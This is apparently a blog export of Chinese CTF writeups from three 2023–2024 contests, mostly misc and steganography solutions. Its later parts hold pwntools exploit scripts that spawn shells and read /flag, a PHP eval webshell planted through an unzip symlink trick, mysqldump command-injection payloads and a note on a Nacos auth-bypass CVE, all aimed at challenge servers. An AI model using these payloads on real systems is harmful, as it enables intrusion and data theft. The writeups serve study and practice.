组合后为flag：@i_n1a_l0v3S_CAOCAOGAIFAN
EZ_misc高度不对，先爆破出正确的宽高
发现两个iend，猜测是snipping的CVE

Matryoshkaosfmount挂载，有三个盘
分别拿到encrypt，normal_rar.rar，not_real_cat.jpg
其中rar可以分离出一张jpg，大小样式与另一张jpg一样，使用双图盲水印

使用veracrypt挂载encrypt，密码为watermark_is_fun
拿到KBAUYVCSKR5XK5TYM5SGC3LMNJXWY4BQPBPXSYLVL54TCZLCL5UHUM27NUYTI4JBEEQX2===‌‍
存在零宽隐写，解密后得到Matryoshka
base32后猜测是维吉尼亚

程序猿QubyQUBY.png可以分离出一个带密码的rar
图片本身的信息是夏多密码，根据码表转换得到HAVEANICEDAY
注意1，6，12分别表示顺时针旋转180°，90°，0°

然后对图片解cloacked-pixel
python2 lsb.py extract QUBY.png out.txt HAVEANICEDAY
得到压缩包密码we1c0met0ycbCTF!!!，解压得到一段wav和两张xlsx表
xlsx表中有外源数据被隐藏了，大约是中间50行~1000行的部分被折叠了，展开再改颜色能看到两种不同的数字

python提取数字后转换成10，画图后两张图拼在一起
from PIL import Imageimport pandass=55s1=60e=1023e1=1028l=0r=63img1=Image.new(&quot;1&quot;,(1050,140))x1=pandas.read_excel(&quot;1.xlsx&quot;)x1values=x1.valuesfor i in range(s-2,e-2):    for j in range(0,r):        if x1values[i][j]&gt;=5:            img1.putpixel((i,j),255)        else:            img1.putpixel((i,j),0)x2=pandas.read_excel(&quot;2.xlsx&quot;)x2values=x2.valuesfor i in range(s1-2,e1-2):    for j in range(0,r):        if x2values[i][j]&gt;=5:            img1.putpixel((i-5,j+63),255)        else:            img1.putpixel((i-5,j+63),0)img1=img1.transpose(Image.FLIP_LEFT_RIGHT)img1.save(&#x27;img.png&#x27;)

密码w0wyoudo4goodj0b

对于wav的带密码的隐写，猜测是DeepSound
解密得到flag.txt和fl4g.txt
fl4g.txt中的字符串先base85在base32，得到sQ+3ja02RchXLUFmNSZoYPlr8e/HVqxwfWtd7pnTADK15Evi9kGOMgbuIzyB64CJ
观察发现恰好是64位，从a-z,A-Z,0-9,+,&#x2F;  猜测是base换表，flag.txt中的值作为密文

两只老虎只给了一张图片，但是发现图片后面的IDAT突然变小了

所以可以删掉前面所有长65536的IDAT块再删一个34018的IDAT块（参考正常的png图片）
爆破宽高，得到右边那张图片，发现右边多了一些像素

原来的图片是1134x720，变成了1144x720
红色部分全是(255,0,0)，既然两图类似，就放stegsolve尝试xor，发现很多小像素点不规律分布
最后发现可以提取每行非黑色像素点的个数去转字符串
from PIL import Imageimg = Image.open(&#x27;solved.bmp&#x27;)w,h = img.sizecount = []for i in range(h):    tmp = 0    for j in range(w):        pixel = img.getpixel((j,i))        if(pixel != (0,0,0)):            tmp += 1    if(tmp!=10):        count.append(tmp-10)print(count)count = &#x27;&#x27;.join(chr(num) for num in count)print(count)#[68, 65, 83, 67, 84, 70, 123, 116, 87, 111, 95, 116, 49, 103, 101, 114, 115, 95, 114, 85, 110, 95, 102, 64, 115, 116, 125]#DASCTF&#123;tWo_t1gers_rUn_f@st&#125;


Easy_VMDK
小明这次使用了32Bytes的随机密码，这次总不会被爆破出来了吧！！小明压缩了好了题目后，他发现压缩后大小比压缩前还大啊，这不就没有压缩啊，这是为什么啊！

对压缩包进行明文攻击，本地看下自己的几个vmdk文件头，发现均为4B 44 4D 56 01 00 00 00 03 00 00 00

拿到一个flag.zip和key.txt
flag.zip分离出一个带密码的压缩包和一个py脚本，其中是key.txt的加密过程
import cv2import base64import binasciiimg = cv2.imread(&quot;key.png&quot;)r, c = img.shape[:2]print(r, c)# 137 2494with open(&quot;key.txt&quot;, &quot;w&quot;) as f:    for y in range(r):        for x in range(c):            uu_byte = binascii.a2b_uu(&#x27;, &#x27;.join(map(lambda x: str(x), img[y, x])) + &quot;\n&quot;)            f.write(base64.b64encode(uu_byte).decode() + &quot;\n&quot;)

解密过程
import cv2import base64import numpy as np# 读取 key.txt 文件内容with open(&quot;key.txt&quot;, &quot;r&quot;) as f:    lines = f.readlines()# 创建空白图像img = np.zeros((137, 2494), dtype=np.uint8)# 还原图像像素值for y in range(137):    for x in range(2494):        # 解码 base64 数据        encoded_data = lines[y * 2494 + x].strip()        decoded_data = base64.b85decode(encoded_data.encode())        # 获取像素值        pixel_value = int.from_bytes(decoded_data, byteorder=&#x27;big&#x27;) % 256        # 设置图像像素        img[y, x] = pixel_value# 保存还原后的图像cv2.imwrite(&quot;restored_key.png&quot;, img)


用这个密码去解压，得到flag
GIFuck根据帧长切割，利用ocr进行批量识别
++++[-&gt;++++&lt;]&gt;[-&gt;++++++&lt;]&gt;-[-&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&gt;+&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;]+++&lt;++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;][-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;][-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;][-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;-&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]+++&lt;+++[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]++&lt;+++&lt;+[-&gt;++++&lt;]&gt;[-&gt;++++&lt;]&gt;[-&gt;+&lt;]&gt;[-&lt;&lt;&lt;+&gt;&gt;&gt;]&lt;&lt;+++++++++[-&gt;+++++++++&lt;]&gt;++.&lt;+++++[-&gt;+++++&lt;]&gt;+++.+++..+++++++.&lt;+++++++++[-&gt;---------&lt;]&gt;--------.&lt;++++++++[-&gt;++++++++&lt;]&gt;++.&lt;++++[-&gt;++++&lt;]&gt;+++.-.&lt;+++++++++[-&gt;---------&lt;]&gt;---.&lt;+++++++++[-&gt;+++++++++&lt;]&gt;++++++++.&lt;+++[-&gt;---&lt;]&gt;-.++++++.---.&lt;+++++++++[-&gt;---------&lt;]&gt;-.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++.++++++.&lt;+++[-&gt;---&lt;]&gt;--.++++++.&lt;++++++++[-&gt;--------&lt;]&gt;-------.&lt;++++++++[-&gt;++++++++&lt;]&gt;+++++++++.&lt;+++[-&gt;+++&lt;]&gt;+.&lt;+++++++++[-&gt;---------&lt;]&gt;--.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++++++++++.+.+++++.&lt;+++++++++[-&gt;---------&lt;]&gt;---.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++++.---.&lt;+++[-&gt;+++&lt;]&gt;++++.&lt;+++[-&gt;---&lt;]&gt;----.&lt;+++++++[-&gt;-------&lt;]&gt;------.[-]&lt;
会输出Sorry but your flag is not here.
真正的flag藏在内存中

]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2023竞赛</tag>
        <tag>羊城杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2024“中华武数杯”全国网络攻防精英赛RHG wp</title>
    <url>/posts/230fa1fb/</url>
    <content><![CDATA[第一次打RHG模式，i春秋的平台和在网上看到的不太一样，一轮是一小时，也可以手动一题一题做然后提交

写了个脚本获取题目信息然后下载，运行写好的exp然后提交flag（写不来自动分析漏洞，就人工代替ai）
&quot;&quot;&quot;# -*- coding: utf-8 -*-# @Author: dr0n1# @Date:   2024/11/27# @link: https://www.dr0n.top/&quot;&quot;&quot;import subprocessimport requestsimport osimport refrom time import sleeptoken = &quot;icqxxx&quot;# 获取题目信息def search(token):    url = &quot;https://apiterminator.ichunqiu.com/xxx&quot;    headers = &#123;&quot;user-agent&quot;: &quot;Mozilla/5.0&quot;&#125;    url = url + &quot;?token=&quot; + token    data = requests.get(url, headers=headers).json()    return data# 下载题目附件并解压def download(file_url, title):    headers = &#123;&quot;user-agent&quot;: &quot;Mozilla/5.0&quot;&#125;    res = requests.get(file_url, headers=headers)    os.makedirs(&#x27;download&#x27;, exist_ok=True)    zip_path = f&#x27;download/&#123;title&#125;.zip&#x27;    with open(zip_path, &#x27;wb&#x27;) as f:        f.write(res.content)    if os.name == &#x27;nt&#x27;:        subprocess.run([&#x27;powershell&#x27;, &#x27;Expand-Archive&#x27;, &#x27;-Path&#x27;, zip_path, &#x27;-DestinationPath&#x27;, f&#x27;download/&#123;title&#125;&#x27;, &#x27;-Force&#x27;])    else:        subprocess.run([&#x27;unzip&#x27;, &#x27;-o&#x27;, zip_path, &#x27;-d&#x27;, f&#x27;download/&#123;title&#125;&#x27;])    print(f&quot;[+]&#123;title&#125;下载解压完成&quot;)# 运行expdef run(docker_ip, docker_port, title):    exp_dir = &#x27;exp&#x27;    prefix = title.split(&#x27;-&#x27;)[0]    for filename in os.listdir(exp_dir):        if filename.startswith(prefix) and filename.endswith(&#x27;.py&#x27;):            file_path = os.path.join(exp_dir, filename)            try:                process = subprocess.Popen([&#x27;python&#x27;, file_path, docker_ip, str(docker_port)], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)            except FileNotFoundError:                return None            stdout, stderr = process.communicate()            return stdout    print(f&quot;[-]&#123;title&#125; 没有对应exp&quot;)    os.makedirs(&#x27;exp&#x27;, exist_ok=True)    open(f&#x27;exp/&#123;prefix&#125;.py&#x27;, &#x27;w&#x27;).close()    return None# 提交flagdef get_flag(token, question_id, flag):    url = &quot;https://apiterminator.ichunqiu.com/xxx&quot;    url = url + &quot;?token=&quot; + token + &quot;&amp;question_id=&quot; + question_id + &quot;&amp;answer=&quot; + flag    headers = &#123;&quot;user-agent&quot;: &quot;Mozilla/5.0&quot;&#125;    res = requests.get(url, headers=headers).json()    return res# 排名查询def rank():    data = &#123;&quot;team_name&quot;: &quot;&quot;, &quot;industry_id&quot;: &quot;&quot;, &quot;attribute_id&quot;: &quot;&quot;, &quot;page_index&quot;: 1, &quot;page_size&quot;: 10, &quot;k&quot;: &quot;BjNQYA0-B2cKewQjUjcBJVdxD3lXPFRmVDRTbgcxXGpVagQ3W25QPVZh&quot;, &quot;stamp&quot;: 1732941812896, &quot;token&quot;: &quot;login:match_1211:e5cedf979df76cda478bde52601c12d7&quot;, &quot;rs&quot;: &quot;83a994740e198e91d37f1f195a515412&quot;&#125;    url = &quot;http://apiterminator.ichunqiu.com/match/rank/solved&quot;    headers = &#123;&quot;user-agent&quot;: &quot;Mozilla/5.0&quot;, &quot;SIGN&quot;: &quot;xxx&quot;&#125;    res = requests.post(url, headers=headers, data=data).json()    return resdata = search(token)if data[&#x27;code&#x27;] != 0:    print(&quot;[-]获取题目信息失败&quot;)    exit()for item in data[&#x27;data&#x27;]:    question_id = item[&#x27;question_id&#x27;]    title = item[&#x27;title&#x27;]    score = item[&#x27;score&#x27;]    real_score = item[&#x27;real_score&#x27;]    file_url = item[&#x27;file_url&#x27;]    is_solved = item[&#x27;is_solved&#x27;]    solved_number = item[&#x27;solved_number&#x27;]    docker_ip = item[&#x27;docker_ip&#x27;]    docker_port = item[&#x27;docker_port&#x27;]    flag_url = item[&#x27;flag_url&#x27;]    attribute = item[&#x27;attribute&#x27;]    if is_solved:        print(f&quot;[+]&#123;title&#125; 已解出&quot;)    else:        download(file_url, title)        print(f&quot;[+]正在解决 &#123;title&#125;&quot;)        flag = run(docker_ip, docker_port, title)        match = re.search(r&#x27;flag\&#123;.*&#125;&#x27;, str(flag))        if match:            flag = match.group()            print(f&quot;[+]&#123;title&#125; flag: &#123;flag&#125;&quot;)            rsp = get_flag(token, question_id, flag)            code = rsp[&#x27;code&#x27;]            message = rsp[&#x27;message&#x27;]            if code == 0:                print(f&quot;[+]&#123;title&#125; 解题成功&quot;)                print(f&quot;[+]&#123;title&#125; 已有&#123;solved_number&#125;次解出&quot;)                print(f&quot;[+]&#123;title&#125; 得分&#123;real_score&#125;&quot;)            else:                print(f&quot;[-]&#123;title&#125; 解题失败&quot;)                print(f&quot;[-]&#123;title&#125; &#123;message&#125;&quot;)        else:            print(f&quot;[-]&#123;title&#125; exp运行失败&quot;)    print(&quot;---------------------------------------------------&quot;)    sleep(1)rank = rank()for item in rank[&#x27;data&#x27;][&#x27;lists&#x27;]:    team_name = item[&#x27;team_name&#x27;]    school = item[&#x27;school&#x27;]    total_score = item[&#x27;total_score&#x27;]    print(f&quot;队伍: &#123;team_name&#125; 学校: &#123;school&#125; 总分: &#123;total_score&#125;&quot;)



不过每一轮就两题，手动也很快，脚本不是很必要
rhg3from pwn import *p = remote(sys.argv[1], int(sys.argv[2]))e = ELF(&quot;./download/rhg3/bin&quot;)bss = e.bss(0x300)p.send(b&#x27;a&#x27; * 0x6c + p8(0x2d))p.sendline(&quot;cat /flag&quot;)print(p.readuntil(&quot;&#125;&quot;))

rhg4from pwn import *p = remote(sys.argv[1], int(sys.argv[2]))p.sendline(&#x27;4294967288&#x27;)p.sendline(&quot;cat /flag&quot;)print(p.readuntil(&quot;&#125;&quot;))

rhg5from pwn import *p = remote(sys.argv[1], int(sys.argv[2]))p.sendline(&#x27;WWDDDADAD&#x27;)p.sendline(&quot;cat /flag&quot;)print(p.readuntil(&quot;&#125;&quot;))


rhg6from pwn import *context.arch = &#x27;i386&#x27;p = remote(sys.argv[1], int(sys.argv[2]))# gdb.attach(p)# pause()shellcode = asm(&#x27;nop\n&#x27; * 19 + shellcraft.sh())shellcode = bytes([i - 1 for i in shellcode])p.send(shellcode)p.sendline(&quot;cat /flag&quot;)print(p.readuntil(&quot;&#125;&quot;))


rhg7from pwn import *import timedef add(size, data=b&#x27;\n&#x27;):    p.sendlineafter(b&#x27;2.show&#x27;, b&#x27;0&#x27;)    p.sendline(str(size).encode())    time.sleep(0.5)    p.send(data)def free(ind):    p.sendlineafter(b&#x27;2.show&#x27;, b&#x27;1&#x27;)    p.sendline(str(ind).encode())def show(ind):    p.sendlineafter(b&#x27;2.show\n&#x27;, b&#x27;2&#x27;)    p.sendline(str(ind).encode())    pass# p = process(&#x27;./download/rhg7/bin&#x27;)p = remote(sys.argv[1], int(sys.argv[2]))system = 0x80488CEbin_sh = 0x080BCF4Fadd(0x8)  # 0add(0x18)  # 1free(0)free(1)add(8, p32(bin_sh) + p32(system))show(0)p.sendline(&quot;cat /flag&quot;)print(p.readuntil(&quot;&#125;&quot;))

rhg8from pwn import *p = remote(sys.argv[1], int(sys.argv[2]))p.sendline(&#x27;0&#x27;)p.sendline(&#x27;0&#x27;)p.sendline(&quot;cat /flag&quot;)print(p.readuntil(&quot;&#125;&quot;))]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>中华武数杯</tag>
        <tag>2024竞赛</tag>
        <tag>RHG</tag>
      </tags>
  </entry>
  <entry>
    <title>2023ciscn初赛wp</title>
    <url>/posts/8bd8be28/</url>
    <content><![CDATA[misc签到卡print(open(&#39;/flag&#39;).read())

被加密的生产流量追踪tcp流，数据提取出来base32


国粹先分割题目.png中的小麻将到output
import osw=0h=0from PIL import Imagea=Image.open(&#x27;题目.png&#x27;)w1,h1=a.sizewhile w&lt;w1:    im=a.crop((w,h,w+53,h+73))    im.save(os.path.join(&#x27;output&#x27;,str(w))+&#x27;.png&#x27;)    w+=53

再将a.png和k.png中的小麻将去output找对应的索引值，分别作为纵坐标和横坐标画图得到flag
import cv2import numpy as npa=cv2.imread(&quot;a.png&quot;)k=cv2.imread(&quot;k.png&quot;)w=len(a[0])i=0import ospath=&#x27;output/&#x27;d=os.listdir(path)d.remove(&quot;0.png&quot;)data=[[],[]]Status=[False,False]def check(im1,im2,sind):    A=cv2.absdiff(im1,im2)    if np.count_nonzero(A) ==0 :        Status[sind]=True        ind=int(j.split(&#x27;.&#x27;)[0])        if ind!=0:            data[sind].append(ind//53)    passwhile i&lt;w:    ima=a[0:73,i:i+53]    imk=k[0:73,i:i+53]    Status=[False,False]    for j in d:        im2=cv2.imread(os.path.join(path,j))        check(ima,im2,0)        check(imk,im2,1)        if Status==[True,True]:            break    i+=53from PIL import Imagea=Image.new(&quot;1&quot;,(42,42))for i in range(w//53):    a.putpixel((data[1][i],data[0][i]),255)a.save(&#x27;123.png&#x27;)a.show()

pyshellpython 沙盒
利用_拼接字符串后eval执行，同时限制了7位字符
Welcome to this python shell,try to find the flag!&gt;&gt;&#x27;open&#x27;&#x27;open&#x27;&gt;&gt;_+&#x27;(&quot;/&#x27;&#x27;open(&quot;/&#x27;&gt;&gt;_+&#x27;fl&#x27;&#x27;open(&quot;/fl&#x27;&gt;&gt;_+&#x27;ag&#x27;&#x27;open(&quot;/flag&#x27;&gt;&gt;_+&#x27;&quot;)&#x27;&#x27;open(&quot;/flag&quot;)&#x27;&gt;&gt;_+&#x27;.&#x27;&#x27;open(&quot;/flag&quot;).&#x27;&gt;&gt;_+&#x27;rea&#x27;&#x27;open(&quot;/flag&quot;).rea&#x27;&gt;&gt;_+&#x27;d()&#x27;&#x27;open(&quot;/flag&quot;).read()&#x27;&gt;&gt;eval(_)&#x27;flag&#123;b8c3ead1-cdad-4ddb-bb81-9486888d426a&#125;\n&#x27;

puzzle打开后有很多宽度不一样的小bmp文件，放进010里分析发现在冗余位多了一些数据
以bfReserved1表示图片左上角x坐标，bfReserved2表示图片左上角y坐标，biXPelsPerMeter表示图片右下角x坐标，biYPelsPerMeter表示图片右下角y坐标画图


画的时候注意biHeight，在bmp中该值是正数说明图像是倒向的即图像存储是由下到上；该值是负数说明图像是倒向的即图像存储是由上到下，所以遇到负数的图片需要反转一下在拼图
import osfrom PIL import Imagefile_list = os.listdir(&#x27;tmp4&#x27;)img = Image.new(&#x27;RGB&#x27;,(7200,4000))for i in range(len(file_list)):    f = open(f&#x27;./tmp4/&#123;file_list[i]&#125;&#x27;,&#x27;rb&#x27;).read()    pic = Image.open(f&#x27;./tmp4/&#123;file_list[i]&#125;&#x27;)    Res1 = int.from_bytes(f[6:8],&#x27;little&#x27;)    Res2 = int.from_bytes(f[8:10],&#x27;little&#x27;)    Xpel = int.from_bytes(f[38:42],&#x27;little&#x27;)    Ypel = int.from_bytes(f[42:46],&#x27;little&#x27;)    If_rev = int.from_bytes(f[22:26],&#x27;little&#x27;)    if(If_rev != 100):        pic = pic.transpose(Image.FLIP_TOP_BOTTOM)    img.paste(pic,(Res1,Res2,Xpel,Ypel))img.save(&#x27;flag.png&#x27;)

拼完后的图跑zsteg，得到第一部分的flag：flag&#123;f1R5T_part_1s_LSB_sTeG0_

然后还是biHeight，高度-100的做0，100的做1，binary之后得到第二部分flag：2nd_paRT_15_reVeRSe_bMp_
import osfrom PIL import Imagefile_list = os.listdir(&#x27;tmp4&#x27;)Res1_L,Res2_L,Ypel_L,XY_L = [],[],[],[]for i in range(len(file_list)):    f = open(f&#x27;./tmp4/&#123;file_list[i]&#125;&#x27;,&#x27;rb&#x27;).read()    Res1 = int.from_bytes(f[6:8],&#x27;little&#x27;)    Res2 = int.from_bytes(f[8:10],&#x27;little&#x27;)    Ypel = int.from_bytes(f[22:26],&#x27;little&#x27;)    Res1_L.append(Res1)    Res2_L.append(Res2)    Ypel_L.append(Ypel)    XY_L.append((Res2,Res1))a = sorted(Res1_L)b = sorted(Res2_L)c = sorted(XY_L)for i in range(len(c)):    ind = XY_L.index(c[i])    if(Ypel_L[ind] == 4294967196):        print(&#x27;0&#x27;,end=&#x27;&#x27;)    else:        print(&#x27;1&#x27;,end=&#x27;&#x27;)


第三部分在补齐字节的数据中找到第一张图片17447199634.bmp，查看补齐字节的数据
发现依次是FF D8，FF E1等

所以可以以padding数据按照左上到右下的顺序拼接得到jpg图片
import osfrom PIL import Imagefile_list = os.listdir(&#x27;tmp4&#x27;)Xpel_L,XY_L,Leng_L,Ypel_L,f_list = [],[],[],[],[]for i in range(len(file_list)):    f = open(f&#x27;./tmp4/&#123;file_list[i]&#125;&#x27;,&#x27;rb&#x27;).read()    Res1 = int.from_bytes(f[6:8],&#x27;little&#x27;)    Res2 = int.from_bytes(f[8:10],&#x27;little&#x27;)    Xpel = int.from_bytes(f[18:22],&#x27;little&#x27;)    Ypel = int.from_bytes(f[22:26], &#x27;little&#x27;)    Xpel_L.append(Xpel)    XY_L.append((Res2,Res1))    Leng_L.append((len(f)-54))    Ypel_L.append(Ypel)c = sorted(XY_L)Padding_file = []for i in range(len(c)):    ind = XY_L.index(c[i])    if(Leng_L[ind] != Xpel_L[ind]*300):        Padding_file.append(ind)data = b&#x27;&#x27;for i in range(len(Padding_file)):    f = open(f&#x27;./tmp4/&#123;file_list[Padding_file[i]]&#125;&#x27;,&#x27;rb&#x27;).read()    w = int.from_bytes(f[18:22], &#x27;little&#x27;)    f = f[54:]    if(len(f)-w*100*3 == 100):        pad = 1    elif(len(f)-w*100*3 == 200):        pad = 2    else:        pad = 3    for j in range(100):        d = f[j*(w*3+pad):j*(w*3+pad)+w*3+pad]        data += d[-pad:]fw = open(&#x27;flag.jpg&#x27;,&#x27;wb&#x27;).write(data)

得到第三部分的flag：3rd_parT_1s_paddINGINGING

crypto基于国密SM2算法的密钥密文分发根据文档一步一步来即可，虽然有点没看懂
先找个网址生成一组公钥和密钥 https://www.lzltool.com/SM2
登录拿id

上传公钥

访问/api/quantum获取密钥密文
访问/api/check发送quantumString的值
使quantumStringUser的值等于quantumStringServer的值即可通过验证
访问/api/search得到flag

可信度量非预期
/proc/22/task/22/environ可以直接看到flag

Sign_in_passwdbase64换表

webunzip上传后返回源码
只能上传zip文件，上传后在tmp目录使用unzip -o解压
&lt;?phperror_reporting(0);highlight_file(__FILE__);$finfo = finfo_open(FILEINFO_MIME_TYPE);if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/zip&#x27;)&#123;    exec(&#x27;cd /tmp &amp;&amp; unzip -o &#x27; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);&#125;;//only this!

//构造一个指向/var/www/html的软连接ln -s /var/www/html poc//保留软连接压缩zip --symlinks test.zip poc//创建跟第一个压缩包中目录同名的目录mkdir poc//接着向目录中写一个shellecho &quot;&lt;?php eval(\$_POST[&#x27;a&#x27;]);?&gt;&quot; &gt; ./poc/shell.php//压缩这个目录zip -r test1.zip poc

上传第一个压缩包后会在tmp目录下生成一个软连接到/var/www/html，当我们上传第二个压缩包时，因为poc目录已经软连接到/var/www/html了，所以解压的时候会把shell.php放在/var/www/html

dumpit根据题目描述可知分别有查询和导出的功能点
根据执行命令后的返回值推测执行的命令如下
传入?db=a&amp;table_2_query=b时会执行select * from a.b传入?db=a&amp;table_2_dump=b时会执行mysqldump -u root a b &gt; log/xxx.log
这里因为a和b的值可控，所以相当于我们可以执行命令了
方法1：直接传?db=ctf&amp;table_2_dump=%0a+id+&gt;+log/1+%0，然后访问log/1
方法2：因为mysqldump在找不到我们给出的表的情况下会抛出错误信息mysqldump: Couldn&#39;t find table: &quot;表名&quot;
在linux中可以利用2&gt;将命令执行的结果输出到文件中
传/?db=ctf&amp;table_2_dump=\&lt;\?\=phpinfo\(\)?\&gt;+2&gt;+log/1.php，然后访问1.php

index.php源码
&lt;?php$servername = &quot;127.0.0.1&quot;;$username = &quot;www-data&quot;;$password = &quot;&quot;;function is_valid($str)&#123;    $black = &#x27;;`*#^$&amp;|&#x27;;    for($i=0;$i&lt;strlen($black);$i++)&#123;    	if(!(stristr($str,$black[$i])===FALSE))&#123;	    return FALSE;	&#125;    &#125;    if(!(stristr($str,&#x27;host&#x27;)===FALSE))&#123;        return FALSE;    &#125;    if(!(stristr($str,&#x27;-h&#x27;)===FALSE))&#123;        return FALSE;    &#125;    return TRUE;&#125;try &#123;    $conn = new PDO(&quot;mysql:host=$servername;dbname=ctf&quot;, $username, $password);&#125;catch(PDOException $e)&#123;    die($e-&gt;getMessage());&#125;if(!isset($_GET[&#x27;table_2_query&#x27;]) &amp;&amp; !isset($_GET[&#x27;table_2_dump&#x27;]))&#123;    echo &#x27;use ?db=&amp;table_2_query= or ?db=&amp;table_2_dump= to view the tables! etc:?db=ctf&amp;table_2_query=flag1&#x27;;    die();&#125;if(isset($_GET[&#x27;db&#x27;]))&#123;    $db=$_GET[&#x27;db&#x27;];&#125;else&#123;    die(&#x27;no db!&#x27;);&#125;if(isset($_GET[&#x27;table_2_query&#x27;]))&#123;    $t2q = $_GET[&#x27;table_2_query&#x27;];    $sql = &quot;select * from $db.$t2q&quot;;    if(!(is_valid($t2q)))&#123;        die(&#x27;nop&#x27;);    &#125;    if(!(is_valid($db)))&#123;        die(&#x27;nop&#x27;);    &#125;    echo $sql;    echo &#x27;&lt;/br&gt;&#x27;;    try&#123;    	$stm = $conn-&gt;query($sql);    	$res = $stm-&gt;fetch();    	var_dump($res);    &#125;    catch(PDOException $e)&#123;    	die(&#x27;error&#x27;);    &#125;    die();&#125;if(isset($_GET[&#x27;table_2_dump&#x27;]))&#123;    $t2d=$_GET[&#x27;table_2_dump&#x27;];    if(!(is_valid($t2d)))&#123;        die(&#x27;nop&#x27;);    &#125;    if(!(is_valid($db)))&#123;        die(&#x27;nop&#x27;);    &#125;    $randstr = md5(time());    $dump=&#x27;mariadb-dump &#x27;.$db.&#x27; &#x27;.$t2d.&#x27; &gt;./log/&#x27;.$randstr.&#x27;.log&#x27;;    system($dump);    echo &#x27;dump log here: &lt;a href=\&#x27;&#x27;.&#x27;./log/&#x27;.$randstr.&#x27;.log&#x27;.&#x27;\&#x27;&gt;here&lt;/a&gt;&#x27;;&#125;?&gt;

BackendServicenacos服务，CVE-2021-29441添加任意用户进后台

分析backend-1.0-SNAPSHOT.jar
发现内部配置服务有个8888的gateway服务，id为backcfg
